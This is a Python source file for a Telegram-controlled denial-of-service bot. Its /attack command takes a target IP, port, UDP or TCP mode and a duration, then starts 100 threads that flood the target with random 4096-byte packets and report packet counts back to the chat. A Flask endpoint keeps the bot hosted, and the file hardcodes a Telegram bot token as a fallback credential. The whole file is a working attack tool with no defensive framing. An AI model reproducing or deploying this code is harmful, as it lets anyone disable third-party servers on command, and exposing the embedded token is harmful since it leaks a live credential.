import socket
import threading
import random
import time
import telebot
import json
import os
from flask import Flask, jsonify

total_sent = 0
count_lock = threading.Lock()
TOKEN = os.environ.get('TOKEN', '8186042947:AAH3yFUwAjhWSqHLBYzvJhNxb4LGap9Eap0')
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

@app.route('/')
def home():
    return jsonify({"message": "Bot đang hoạt động!"})

def send_udp(ip, port, dur):
    global total_sent
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(4096)
    timeout = time.time() + dur
    while time.time() < timeout:
        try:
            s.sendto(data, (ip, port))
            with count_lock:
                total_sent += 1
        except:
            continue

def send_tcp(ip, port, dur):
    global total_sent
    timeout = time.time() + dur
    data = random._urandom(4096)
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            sock.send(data)
            sock.close()
            with count_lock:
                total_sent += 1
        except:
            continue

def stats(dur, chat_id):
    global total_sent
    start = time.time()
    while time.time() - start < dur:
        time.sleep(1)
        with count_lock:
            status = {
                "Status": "Ongoing",
                "PacketsSent": total_sent,
                "TimeElapsed": round(time.time() - start, 2)
            }
            bot.send_message(chat_id, f"```json\n{json.dumps(status, indent=2)}\n```", parse_mode="Markdown")

def flood(ip, port, mode, concurrent, seconds, chat_id, username):
    global total_sent
    total_sent = 0
    start_info = {
        "Attack": "Started!",
        "Caller": username,
        "Target": f"{ip}:{port}",
        "Mode": mode.upper(),
        "Duration": f"{seconds} seconds",
        "Threads": concurrent
    }
    bot.send_message(chat_id, f"```json\n{json.dumps(start_info, indent=2)}\n```", parse_mode="Markdown")
    flood_func = send_udp if mode == "udp" else send_tcp
    threading.Thread(target=stats, args=(seconds, chat_id), daemon=True).start()
    thread_pool = []
    for _ in range(concurrent):
        th = threading.Thread(target=flood_func, args=(ip, port, seconds))
        th.daemon = True
        th.start()
        thread_pool.append(th)
    for th in thread_pool:
        th.join()
    end_info = {
        "Attack": "Completed!",
        "Target": f"{ip}:{port}",
        "Mode": mode.upper(),
        "TotalPackets": total_sent
    }
    bot.send_message(chat_id, f"```json\n{json.dumps(end_info, indent=2)}\n```", parse_mode="Markdown")

@bot.message_handler(commands=['attack'])
def attack_command(message):
    try:
        args = message.text.split()[1:]
        if len(args) != 4:
            bot.reply_to(message, "Usage: /attack [ip] [port] [mode: udp/tcp] [seconds]")
            return
        ip, port, mode, seconds = args
        port = int(port) if port else 80
        seconds = int(seconds)
        if mode not in ["udp", "tcp"]:
            bot.reply_to(message, "Mode must be 'udp' or 'tcp'")
            return
        username = message.from_user.username or message.from_user.first_name
        threading.Thread(target=flood, args=(ip, port, mode, 100, seconds, message.chat.id, username)).start()
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

def run_bot():
    bot.polling()

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    flask_thread.start()
    bot_thread.start()
    flask_thread.join()
    bot_thread.join()
